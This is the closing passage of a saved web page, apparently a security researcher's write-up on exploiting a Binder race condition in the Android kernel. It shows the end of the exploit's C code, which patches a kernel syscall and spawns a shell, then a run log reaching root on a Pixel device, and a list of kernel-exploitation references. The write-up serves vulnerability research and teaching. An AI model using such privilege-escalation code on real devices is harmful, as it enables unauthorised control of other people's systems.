<span class="n">memcpy</span><span class="p">(</span><span class="n">sys_capset_addr</span><span class="p">,</span> <span class="n">sys_capset</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">sys_capset</span><span class="p">));</span>

<span class="cm">/* Starting a shell */</span>
<span class="n">system</span><span class="p">(</span><span class="s">"sh"</span><span class="p">);</span>

<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</code></pre></div>

<h5 id="root-shell">Root Shell</h5>
<p>Finally, we can put everything together and start the exploit to obtain a root shell.</p>
<div class="codehilite"><pre><span></span><code><span class="err">[6397] exploit.c:508:trigger_thread_func(): Patching SyS_capset()</span>
<span class="err">[6397] exploit.c:585:trigger_thread_func(): capset returned 0</span>
<span class="err">[6397] exploit.c:588:trigger_thread_func(): Restoring SyS_capset()</span>
<span class="err">id</span>
<span class="err">uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0</span>
<span class="err">uname -a</span>
<span class="err">Linux localhost 4.14.170-g5513138224ab-ab6570431 #1 SMP PREEMPT Tue Jun 9 02:18:01 UTC 2020 aarch64</span>
</code></pre></div>

<h2 id="references">References</h2>
<ul>
<li><em>Binder Transactions In The Bowels of the Linux Kernel</em> - Synkactiv<ul>
<li><a href="https://www.synacktiv.com/en/publications/binder-transactions-in-the-bowels-of-the-linux-kernel">https://www.synacktiv.com/en/publications/binder-transactions-in-the-bowels-of-the-linux-kernel</a></li>
</ul>
</li>
<li><em>Exploiting CVE-2020-0041: Escaping the Chrome Sandbox</em> - Blue Frost Security<ul>
<li>Part 1: <a href="https://labs.bluefrostsecurity.de/blog/2020/03/31/cve-2020-0041-part-1-sandbox-escape/">https://labs.bluefrostsecurity.de/blog/2020/03/31/cve-2020-0041-part-1-sandbox-escape/</a></li>
<li>Part 2: <a href="https://labs.bluefrostsecurity.de/blog/2020/04/08/cve-2020-0041-part-2-escalating-to-root/">https://labs.bluefrostsecurity.de/blog/2020/04/08/cve-2020-0041-part-2-escalating-to-root/</a></li>
</ul>
</li>
<li><em>Android Kernel Sources</em> - Before the patch for CVE-2020-0423<ul>
<li><a href="https://android.googlesource.com/kernel/common/+/13abe236365485368755fb76c57a67a9b1f640d8/">https://android.googlesource.com/kernel/common/+/13abe236365485368755fb76c57a67a9b1f640d8/</a></li>
</ul>
</li>
<li><em>Service Manager Sources</em><ul>
<li><a href="https://android.googlesource.com/platform/frameworks/native/+/5516d77f61c0553f20b7332842863bc511a97074/cmds/servicemanager/binder.c">https://android.googlesource.com/platform/frameworks/native/+/5516d77f61c0553f20b7332842863bc511a97074/cmds/servicemanager/binder.c</a></li>
</ul>
</li>
<li><em>Building a Pixel kernel with KASAN+KCOV</em><ul>
<li><a href="https://source.android.com/devices/tech/debug/kasan-kcov">https://source.android.com/devices/tech/debug/kasan-kcov</a></li>
</ul>
</li>
<li><em>The SLUB allocator</em> - PaoloMonti42<ul>
<li><a href="https://github.com/PaoloMonti42/salt/blob/master/docs/0x00_SLUB_refresher.md">https://github.com/PaoloMonti42/salt/blob/master/docs/0x00_SLUB_refresher.md</a></li>
</ul>
</li>
<li><em>Google Developers</em> - Pixel 4 "flame" factory images<ul>
<li><a href="https://developers.google.com/android/images#flame">https://developers.google.com/android/images#flame</a></li>
</ul>
</li>
<li><em>Mitigations are attack surface, too</em> - Project Zero<ul>
<li><a href="https://googleprojectzero.blogspot.com/2020/02/mitigations-are-attack-surface-too.html">https://googleprojectzero.blogspot.com/2020/02/mitigations-are-attack-surface-too.html</a></li>
</ul>
</li>
<li><em>CVE-2017-11176: A step-by-step Linux Kernel exploitation</em> - Lexfo<ul>
<li>Part 1: <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html">https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html</a></li>
<li>Part 2: <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part2.html">https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part2.html</a></li>
<li>Part 3: <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html">https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html</a></li>
<li>Part 4: <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html">https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html</a></li>
</ul>
</li>
<li><em>KSMA: Breaking Android kernel isolation and Rooting with ARM MMU features</em> - ThomasKing<ul>
<li><a href="https://i.blackhat.com/briefings/asia/2018/asia-18-WANG-KSMA-Breaking-Android-kernel-isolation-and-Rooting-with-ARM-MMU-features.pdf">https://i.blackhat.com/briefings/asia/2018/asia-18-WANG-KSMA-Breaking-Android-kernel-isolation-and-Rooting-with-ARM-MMU-features.pdf</a></li>
</ul>
</li>
</ul>
</div>
					 </div>
					</div>
				</div>

			</div>
			</div>
		</div>


		<footer class="page-footer grey darken-3">
			<div class="container">
				<div class="row">
					<div class="col l12 s12 center-align">
						<p class="grey-text lighten-1">© 2020 Longterm Security, Inc.</p>
					</div>
				</div>
			</div>
		</footer>

		<!--  Scripts-->
		<script src="./2020 - Exploiting a Single Instruction Race Condition in Binder_files/jquery.min.js.下載"></script>
		<script src="./2020 - Exploiting a Single Instruction Race Condition in Binder_files/materialize.js.下載"></script>
		<script src="./2020 - Exploiting a Single Instruction Race Condition in Binder_files/init.js.下載"></script>
		<script src="./2020 - Exploiting a Single Instruction Race Condition in Binder_files/contact.js.下載"></script>
	

</div><div class="hiddendiv common"></div><div class="drag-target" data-sidenav="nav-mobile" style="left: 0px; touch-action: pan-y; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></div></body></html>